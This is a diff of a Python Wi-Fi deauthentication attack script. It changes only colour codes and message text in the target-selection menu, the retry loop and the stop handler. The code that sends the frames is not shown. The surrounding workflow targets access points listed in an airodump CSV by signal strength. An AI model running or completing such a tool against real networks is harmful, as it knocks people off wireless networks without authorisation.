@@ -95,26 +95,26 @@ def DeauthWorkflow(interface: str, deauthCount: int, csvFile: str, pwrThreshold:
                 break
             success = AttemptDeauth(interface, bssid, channel, deauthCount, attempt)
             if success:
-                print(f"{BOLD}[+] Success on attempt {attempt}.{RESET}")
+                print(f"{RED}{BOLD}[+] Success on attempt {attempt}.{RESET}")
                 break
             if attempt == MAX_ATTEMPTS:
                 print(f"{RED}[-] Failed after {MAX_ATTEMPTS}.{RESET}")
             else:
-                print(f"{BOLD}[*] Retrying...{RESET}")
+                print(f"{RED}[*] Retrying...{RESET}")
 
     print(f"\n{BOLD}Done.{RESET}")
 
 def menu():
-    interface = input(f"{BOLD}Interface [{DEFAULT_INTERFACE}]: {RESET}").strip() or DEFAULT_INTERFACE
+    interface = input(f"{RED}Interface [{DEFAULT_INTERFACE}]: {RESET}").strip() or DEFAULT_INTERFACE
     try:
-        count = int(input(f"{BOLD}Deauth packets [{DEFAULT_DEAUTH_COUNT}]: {RESET}").strip())
+        count = int(input(f"{RED}Deauth packets [{DEFAULT_DEAUTH_COUNT}]: {RESET}").strip())
     except ValueError:
         count = DEFAULT_DEAUTH_COUNT
     try:
-        pwrThreshold = int(input(f"{BOLD}PWR threshold [{DEFAULT_PWR_THRESHOLD}]: {RESET}").strip())
+        pwrThreshold = int(input(f"{RED}PWR threshold [{DEFAULT_PWR_THRESHOLD}]: {RESET}").strip())
     except ValueError:
         pwrThreshold = DEFAULT_PWR_THRESHOLD
-    csvFile = input(f"{BOLD}Airodump CSV file: {RESET}").strip()
+    csvFile = input(f"{RED}Airodump CSV file: {RESET}").strip()
     DeauthWorkflow(interface, count, csvFile, pwrThreshold)
 
 def terminal():
@@ -132,7 +132,7 @@ def terminal():
 
 def SignalHandler(sig, frame):
     global stopAttack
-    print(f"\n{RED}[!] Stopping attack...{RESET}")
+    print(f"\n{RED}Stopping the attack...{RESET}")
     stopAttack = True
 
 def main():
